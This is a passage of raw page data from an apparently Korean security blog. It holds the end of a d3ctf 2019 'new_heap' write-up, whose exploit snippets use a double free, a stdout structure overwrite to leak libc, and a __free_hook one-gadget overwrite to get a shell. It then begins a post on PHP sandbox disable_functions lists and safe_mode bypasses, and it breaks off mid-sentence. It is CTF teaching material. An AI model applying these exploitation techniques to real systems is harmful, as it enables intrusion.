style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Double Free Bug를 바탕으로 같은 주소를 가리키게 한 다음 해당 크기 만큼 동적할 당하여 FD 값을 <code class=\"language-text\">\\x70</code> 바이트로 변조하여 Fake Chunk를 가리키게 한다.</li>\n<li>다음 할당은 버리고 Fake Chunk에 값을 써 하위 3바이트 부분을 stdout 주소로 변조한다.</li>\n<li>그럼이제 stdout을 조작할 준비가 끝났다.</li>\n</ul>\n<h2 id=\"overwrite-stdout-struct\" style=\"position:relative;\"><a href=\"#overwrite-stdout-struct\" aria-label=\"overwrite stdout struct permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overwrite Stdout Struct</h2>\n<ul>\n<li>Double Free Bug를 통해 조작한 stdout 주소가 존재하는 위치에 힙 청크를 할당 한다.</li>\n<li>할당하게 되면 FD가 stdout 주소가 되기 때문에 다음 할당 시 stdout 구조체에 할당이 되어 해당 구조체에 값을 쓸 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free bug</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\"</span><span class=\"token punctuation\">)</span> # <span class=\"token constant\">stdout</span> <span class=\"token number\">1</span> byte \\x60\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABCklEQVQY032NyW6DMBRF+Y4IbPCEHx6obYhNAkkhbapKWTWLpJv+/2dUnRZV1UhncRf36GTjbKfJjqdtt0S/cU0rQ2p8BB+BCImoxOxfsvwYkVH5HPI5knZf8roS8osb2o/8EJHW+bIu5gHrHWY1Zh/B281vuXiMSKvVocsPCetdTmRBATEouSz5ryv6M7KVsURY1vZgJ2oXcGsTWttS7YQJoqB1QWvEZMkkYbLkUH1SMsAcso0Hq/Xk0i6krm+jC31IrY1emglMBDNIPYgmCgAmJRWKcEO4IrwCm10v5n4xpxdzvqh07vHwTMc3Ol59tz3v59fD8Slu17Xqa2U4UOORS9gN+C4S0bwDhvZGszDf0eIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/f210e0c184e41d303510650668f2cd66/37523/10.png\"\n        srcset=\"/static/f210e0c184e41d303510650668f2cd66/e9ff0/10.png 180w,\n/static/f210e0c184e41d303510650668f2cd66/f21e7/10.png 360w,\n/static/f210e0c184e41d303510650668f2cd66/37523/10.png 720w,\n/static/f210e0c184e41d303510650668f2cd66/35751/10.png 873w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>이제 stdout 구조체를 영역을 할당하여 값을 조작하도록 한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 513px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 101.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsTAAALEwEAmpwYAAADHElEQVQ4y22U2ZKcOBBF6zdm3M1SgNjXArEIJJBAiLWquqfHDv//h0xQ5Ziw247Ih3w5efPeSOnEsqRPfGQ5EF7yJq8JqtuyxHnFWIo6xYplK1LMQDFDWbc0w9J1S9Mty7CBYZ/8GFYNTfPaDlKIuooMEHWy7pxN7wwcWTMVw5J18yjNkg1bMRwFOJJhSbp1knSLjesw73y5NpRjype3fzs+be9fMRthibthTotmmPa2n+tuQJimZePF2esZnFTgtv1EesHE1nQ8KRBfb8OyX//5ttw+IDrgErOWCb7cUDvQYcrrNquwpJkHzPgi1jubtn7aLkVNxdbP67Td7x/fISKYCUzHhvL19tF0vB+XS9HkDVWBfVKA0w1Tx2fSi4qwtGz4euvn7fr+dbl9JLCifC4aiunYT3tF2EO5S0ssaeCkAHd4aA7LFRFWUy72ezuI/f1b3Q0lpsdQTKf9nfTTMahuvRjqtn8EpgCn7QVmI6Yj6UVS1HRco6w4m+6PAs7ZdDXLUx+NCmxZtyXNlHXr8NyLbdrfx+XGl1uJu6Jpddt/UfRX1Xg9gxfVeFENSQOSZkma+cSedSiTfsKMh1nRjUtFWARRDCsvSuOscsJLlJX+JddtX/4J+x92mVj5vKclFtvdCRLTi53wotue6Ua67dtBYgWJZnmfyB/KqO3puCLSZxXOKhKkRZSVcY7ivAqzQtbM1zN4HNlvsHoENrFpE9tb0w5UrLgfTe/Q1B1fs7ynz9czkP6wtnF4ZmJF7QARgYjEsDK9SDFszfKAGxpuYDiB6UVn0/0D3PEZs7EiPV9vYr9P+xsTaztMmA4xRF6cOeElhpVh+9Kx/69rk2Ea5muSo4aNsCZ2mARpHueVFcSG49t+Yvmx6cXACRTD/hwY5fMw7ZiJoqHtMIvtHsPyUtR2kAQXmOQozqooq9wwVYHzeW3MBJ+vhAnSCydMkhz9Jal/y9oXxfii6M/m5XEwnz0f71nsbT81jI/rrRvnKM0NJ3hGZXoRcEMVOMrxDdifYeBGSY7SEj+MRRARJ0qLhsaweuSEsrJRf8Oe8H/evfFGlkHi0wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png\"\n        srcset=\"/static/dfec5074f1609d93b8deaeec6076a1f4/e9ff0/11.png 180w,\n/static/dfec5074f1609d93b8deaeec6076a1f4/f21e7/11.png 360w,\n/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png 513w\"\n        sizes=\"(max-width: 513px) 100vw, 513px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>_IO_FILE 구조체의 stdout을 확인해 보면 우리가 변조해야 할 부분은 <code class=\"language-text\">_flags</code>, <code class=\"language-text\">_IO_write_base</code> 이다.</li>\n<li>기존의 stdout flags 값은 <code class=\"language-text\">0xfbad2887</code> , <code class=\"language-text\">_IO_IS_APPENDING</code> 플래그가 존재하지 않기 때문에 <code class=\"language-text\">0xfbad2887 | 0x1000</code> 값으로 조작하자</li>\n<li><code class=\"language-text\">_IO_write_base</code> 값의 하위 바이트를 <code class=\"language-text\">\\x20</code> 으로 조작해 라이브러리 주소를 출력 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free bug</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\"</span><span class=\"token punctuation\">)</span> # <span class=\"token constant\">stdout</span> <span class=\"token number\">1</span> byte \\x60\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1887</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x20\"</span><span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> <span class=\"token function\">uu64</span><span class=\"token punctuation\">(</span><span class=\"token function\">r</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3eb780</span>\none_shot <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x4f3c2</span>\nfree_hook <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x3ed8e8</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">)</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one_shot \"</span><span class=\"token punctuation\">,</span>one_shot<span class=\"token punctuation\">)</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"free_hook\"</span><span class=\"token punctuation\">,</span>free_hook<span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABhUlEQVQoz5XR227UMBAG4H0QtDn4OPbYju1kk2ySJs522aqogKjoBWoLvP9LIApC3RYhIf2am5lPM9Jsbm/vpuVtVY3a1IGIQGVg0DJwTzVSCWBLYQuOVBgi9JaIjMpf2Xz68jDNq5YoJTpdKYmUSEGBUSmo5EQIMCXXGYOCqYLBH/kTf7j5mE437XDshuTawSqHVHgqFZWeSsOAcp1xLJguuSq52j7H69W7EHaOKMN0pDJS4TkGYZGrKLBhoABLYXNuqTT0xdl3D9/SfFlD41ScwSYOrXS1bg24xvjElNWWgC+kZ8pzMOf4/uuUTtQkgl0Z2pHjTtig9gg+oj8QsNrlEP6OP98/zuO6UD1KXJVJXO9Bh6oBXVUh9goNOga+hMAxvtr8+H2aD62uootdN/UuutCEtOpd7/cDQ6utj/2C9ei7CwZ4hpfDVTel+XR9ef3e1t2WypxB8dTLichKkTHIGOTnT/qNj8uxGZb+Yq27Eavm9cQ/stnVnbQBbMwZvCnYf+Ef6sFyZN467kAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png\"\n        srcset=\"/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/e9ff0/12.png 180w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/f21e7/12.png 360w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png 720w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/efc66/12.png 885w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>라이브러리 주소를 획득할 수 있다.</li>\n</ul>\n<h2 id=\"shell\" style=\"position:relative;\"><a href=\"#shell\" aria-label=\"shell permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>shell!</h2>\n<ul>\n<li>Double Free Bug를 통해 __free_hook에 할당을 한 후 oneshot 가젯 주소로 조작한다.</li>\n<li>free 함수를 호출하여 쉘을 획득 할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'A'</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>one_shot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 702px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABGUlEQVQoz43O6WqEMBQF4DxIR8clJjGbiVvUaHR0NjpIGUr7/m9SKLR/OkyF8+fA/Q4XNCz7WO/Xt3dZdnkzBUTtCEsQ5zH2/wSmcp+wKEn3kPgxBpZln+v9tN65rnXd87yFVAQRjh/hEFEfpgEk++8KQkiMndxyQVR6MYoQDSDxYuQ9wl6E/Bj9VsAx7drBHa9U5gmVPxd4S8BR6HM7qKbPCqNry1UZwHQrnpm8DbMZF6GrrGxSob0I7cJkEzZ549yiTc9VpaqOyoLIHHO15XnwWltnrDJW6EpXLeYqJiJC7CWAuzB5PgHGVKzj0Z1vxrp+PjfDzLKCcEWzgggdYfbEg4Nb7OFU28mOS+vm1s2dW/rpVLbDv/gL5YZkcN0MV2IAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./13.png\"\n        title=\"./13.png\"\n        src=\"/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png\"\n        srcset=\"/static/f9aedffc660490664fdf82d881bd8f5b/e9ff0/13.png 180w,\n/static/f9aedffc660490664fdf82d881bd8f5b/f21e7/13.png 360w,\n/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png 702w\"\n        sizes=\"(max-width: 702px) 100vw, 702px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95\">보호 기법</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#alloc\">alloc</a></li>\n<li><a href=\"#free\">free</a></li>\n<li><a href=\"#memory-leak-idea\">memory leak Idea</a></li>\n<li><a href=\"#_io_file_stdout\">_IO_FILE_stdout</a></li>\n<li><a href=\"#stdout\">stdout</a></li>\n<li><a href=\"#_io_new_file_xsputn-%ED%95%A8%EC%88%98\">_IO_new_file_xsputn 함수</a></li>\n<li><a href=\"#new_do_write-%ED%95%A8%EC%88%98\">new_do_write 함수</a></li>\n<li><a href=\"#how-to-exploit-using-stdout\">How to exploit using stdout</a></li>\n<li><a href=\"#double-free-bug\">Double Free Bug</a></li>\n<li><a href=\"#fake-chunk-%EA%B5%AC%EC%84%B1\">Fake chunk 구성</a></li>\n<li><a href=\"#how-to-free\">How to Free?</a></li>\n<li><a href=\"#free-fake-chunk\">Free Fake chunk</a></li>\n<li><a href=\"#point-to-stdout\">point to stdout</a></li>\n<li><a href=\"#overwrite-stdout-struct\">Overwrite Stdout Struct</a></li>\n<li><a href=\"#shell\">shell!</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"d3ctf 2019 new_heap 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍣"},"fields":{"slug":"/d3ctf2019_new_heap_ctf_writeup/"}},"prev":{"id":"dd671d44-da84-5ada-8e07-fb7f748efb94","html":"<h1 id=\"web-application--php\" style=\"position:relative;\"><a href=\"#web-application--php\" aria-label=\"web application  php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Web Application : PHP</h1>\n<ul>\n<li>php를 활용한 rce는 다음 설명에서 간단하게 진행했고 밑의 링크를 통해 읽으시면 되요.</li>\n</ul>\n<p><a href=\"https://dnsdudrla97.github.io/web_application_rce1/\">Web Application RCE Case</a></p>\n<h1 id=\"php-security-1\" style=\"position:relative;\"><a href=\"#php-security-1\" aria-label=\"php security 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Security 1</h1>\n<ul>\n<li>다음은 PHP 보안 기법중 <code class=\"language-text\">Sandbox</code> 에 대하여 설명을 진행할께요.😛</li>\n</ul>\n<h2 id=\"php-sandbox\" style=\"position:relative;\"><a href=\"#php-sandbox\" aria-label=\"php sandbox permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Sandbox</h2>\n<aside>\n💡 SandBox 가 뭘까?\n> 애플리케이션 환경에서 대상 리눅스 명령어를 사용할 수 있는 권한이 있더라고 대상 애플리케이션이 설정한 권한 이외의 행동을 수행할 수 없게 한다.\n</aside>\n<p><strong>Disable Function</strong></p>\n<ul>\n<li>애플리케이션 설정된 PHP 함수에 대해 액세스를 제한하는 기능</li>\n<li>공격할 수 있는 구간이 존재하여 <code class=\"language-text\">명령 실행(system, proc_open, shell_exec)</code>, <code class=\"language-text\">소켓(socket)</code> , <code class=\"language-text\">통신(curl)</code> 해당 함수들을 이용하는 경우 <code class=\"language-text\">Disable Function으로 작성할 시 공격이 어렵다.</code></li>\n</ul>\n<aside>\n💡 Sandbox 개념에서 시스템 함수들이 비활성화되어 있지만 우회하면 되겠죠?\n</aside>\n<div class=\"gatsby-highlight\" data-language=\"markdown\"><pre class=\"language-markdown\"><code class=\"language-markdown\"><span class=\"token title important\"><span class=\"token punctuation\">##</span> Disable Function Example</span>\n<span class=\"token list punctuation\">-</span> exec\n<span class=\"token list punctuation\">-</span> passthru\n<span class=\"token list punctuation\">-</span> shell_exec\n<span class=\"token list punctuation\">-</span> system\n<span class=\"token list punctuation\">-</span> proc_open\n<span class=\"token list punctuation\">-</span> popen\n<span class=\"token list punctuation\">-</span> curl_exec\n<span class=\"token list punctuation\">-</span> curl_multi_exec\n<span class=\"token list punctuation\">-</span> parse_ini_file\n<span class=\"token list punctuation\">-</span> show_source</code></pre></div>\n<p><strong>Safe_Mode</strong></p>\n<ul>\n<li><code class=\"language-text\">chroot</code> 가 설정된 <code class=\"language-text\">/var/www/html</code> 디렉토리 가 웹 루트로 설정되어 쉘 명령(<code class=\"language-text\">/bin/ls, /bin/id</code>) 을 사용할 수 없게 된다.</li>\n<li>uid, gid가 다른 경우 접근할 수 없다.\n<ul>\n<li><code class=\"language-text\">/etc/passwd</code> 와 같은 파일의 경우 <code class=\"language-text\">safe_mode</code> 의 특정 옵션이 켜지면 접근할 수 없다.</li>\n</ul>\n</li>\n<li><code class=\"language-text\">safe_mode</code> 가 걸린 PHP 에서 시스템 명령을 사용하는 경우 예외 처리되는 모습을 확인할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"markdown\"><pre class=\"language-markdown\"><code class=\"language-markdown\">cat /etc/php.ini | grep safe_mode</code></pre></div>\n<ul>\n<li><code class=\"language-text\">/etc</code> 밑에 php.ini 설정 파일로 safe_mode on/off 로 설정이 가능하다.</li>\n</ul>\n<p><strong>Safe_Mode Bypass</strong></p>\n<ul>\n<li>간단하게 <code class=\"language-text\">safe_mode</code> 에 대해서 설명을 했는데 이를 우회하기 위해서는 몇가지 방안이 있다.\n<ul>\n<li>Safe_Mode 취약한 함수를 사용해서 Exploit를 진행 (curl, socket, …)</li>\n</ul>\n</li>\n<li>PHP 에서 사용하는 모듈 취약점을 이용해서 Exploit을 진행\n<ul>\n<li>Mode cgi, PHP-FPM</li>\n</ul>\n</li>\n<li>PHP 에는 많은 CVE가 존재\n<ul>\n<li>모듈 취약점을 사용할시 PHP 버전에 의존하지 않아도 된다.</li>\n<li>PHP 버전과 관계 없는 해당 모듈을 사용하는 하위 버전이 전부 작동한다.</li>\n</ul>\n</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQY012QbU/CQBCEK28FFQqlVKS0Uit9u6uNEQjw///XY3bN+cEPk5m93ZlMzivrE69JxTp+J4xynuY7xn7EcBzyMFwymqxVCwajlcJptxOWWe49090oyi/q9kJe9JjuStWeSd8MWW5J0oZ91hJvP0gPVt9l/oVhuyt5XiQaqoGtvVI1ZyTYfN441t90/Z3aXMgOliDMiOKCxTJVk7R37Np5g0DDpKVn+ztVc9Im82CPP4uZTDfKYhI9fXzBn23+jP/hvkIa/gDSuGPr6m+9UgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png\"\n        srcset=\"/static/68b2df255fae24cf0c75a2d91c56e424/e9ff0/0.png 180w,\n/static/68b2df255fae24cf0c75a2d91c56e424/f21e7/0.png 360w,\n/static/68b2df255fae24cf0c75a2d91c56e424/37523/0.png 720w,\n/static/68b2df255fae24cf0c75a2d91c56e424/58bb7/0.png 985w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"php-rce-1-day-case\" style=\"position:relative;\"><a href=\"#php-rce-1-day-case\" aria-label=\"php rce 1 day case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP RCE 1-day case</h1>\n<ul>\n<li>취약한 대상 애플리케이션 